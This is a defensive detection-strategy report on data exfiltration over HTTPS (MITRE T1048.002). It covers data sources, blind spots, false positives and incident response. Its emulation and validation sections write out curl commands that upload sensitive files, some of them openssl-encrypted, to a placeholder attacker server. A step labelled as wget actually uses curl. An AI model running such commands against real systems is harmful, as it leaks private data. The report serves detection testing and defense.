# Alerting & Detection Strategy (ADS) Report: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

## Goal
The primary objective of this detection strategy is to identify adversarial attempts to bypass security monitoring by exfiltrating data through asymmetrically encrypted non-command-and-control protocols, specifically HTTPS.

## Categorization
- **MITRE ATT&CK Mapping:** T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- **Tactic / Kill Chain Phases:** Exfiltration
- **Platforms:** Linux, macOS, Windows

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1048/002)

## Strategy Abstract
The detection strategy focuses on monitoring network traffic and file activity to identify potential data exfiltration attempts using asymmetrically encrypted protocols like HTTPS. Key data sources include:

- **Network Traffic:** Monitor for unusual outbound HTTPS connections.
- **File Activity Monitoring (FAM):** Detect unauthorized access or modification of sensitive files.
- **Endpoint Detection & Response (EDR):** Analyze processes and command-line arguments indicative of exfiltration attempts.

Patterns analyzed involve deviations from normal network behavior, such as unexpected external destinations, large data transfers outside business hours, and the use of uncommon ports for HTTPS traffic.

## Technical Context
Adversaries may exploit asymmetric encryption to securely exfiltrate data without detection by traditional security controls. This technique leverages commonly used protocols like HTTPS, making it challenging to distinguish malicious activity from legitimate traffic.

### Adversary Emulation Details

#### Sample Commands and Test Scenarios:
- **Windows (using curl):**
  ```shell
  curl --data-binary "@sensitive_data.txt" https://malicious-server.com/upload
  ```
  
- **Linux/macOS/FreeBSD (using curl):**
  ```shell
  curl --data-binary "@/path/to/sensitive_data.txt" https://malicious-server.com/upload
  ```

- **Using wget for file transfer:**
  ```shell
  echo "sensitive data" | openssl rsautl -encrypt -pubin -inkey server_public_key.pem | \
  curl --data-urlencode "@-" https://malicious-server.com/receive
  ```

## Blind Spots and Assumptions
- **Encrypted Traffic:** The strategy may miss exfiltration attempts if encryption is used effectively to mask data patterns.
- **Behavior Baselines:** Assumes accurate baselining of "normal" network behavior, which can vary significantly across organizations.
- **Dynamic Data Patterns:** May not detect novel or highly obfuscated exfiltration techniques.

## False Positives
Potential benign activities that could trigger false alerts include:

- Legitimate use of HTTPS for business-related data transfers.
- Scheduled backup operations using encrypted protocols.
- Automated updates or patches distributed over secure channels.

## Priority
**High**

Justification: The technique allows adversaries to bypass traditional security monitoring by leveraging legitimate traffic, posing a significant risk to sensitive information confidentiality and integrity.

## Validation (Adversary Emulation)
To validate this detection strategy in a controlled test environment:

1. **Windows (using curl):**
   - Command: `curl --data-binary "@sensitive_data.txt" https://test-server.com/upload`
   - Monitor network traffic for unexpected HTTPS data exfiltration to the designated server.

2. **Linux/macOS/FreeBSD (using curl):**
   - Command: `curl --data-binary "@/path/to/sensitive_data.txt" https://test-server.com/upload`
   - Observe similar network anomalies and file access logs.

3. **File Exfiltration Using wget:**
   - Command:
     ```shell
     echo "sensitive data" | openssl rsautl -encrypt -pubin -inkey test_server_public_key.pem | \
     curl --data-urlencode "@-" https://test-server.com/receive
     ```
   - Track for command usage and unusual encrypted payloads.

## Response
When an alert is triggered:

1. **Immediate Investigation:**
   - Verify the legitimacy of the outbound connection.
   - Examine the source and destination IP addresses, ports used, and data volume.

2. **Containment Measures:**
   - Isolate affected systems to prevent further data loss.
   - Block suspicious external IPs or domains if necessary.

3. **Forensic Analysis:**
   - Collect logs from network devices, endpoints, and security tools for detailed analysis.
   - Determine the scope of compromised data and assess potential impact.

4. **Notification and Reporting:**
   - Inform relevant stakeholders about the incident.
   - Update incident response plans based on findings to enhance future detection capabilities.

## Additional Resources
- [Curl Usage on Linux](https://curl.se/docs/manpage.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Endpoint Detection & Response (EDR) Best Practices](https://securityintelligence.com/what-is-edr-endpoint-detection-response/)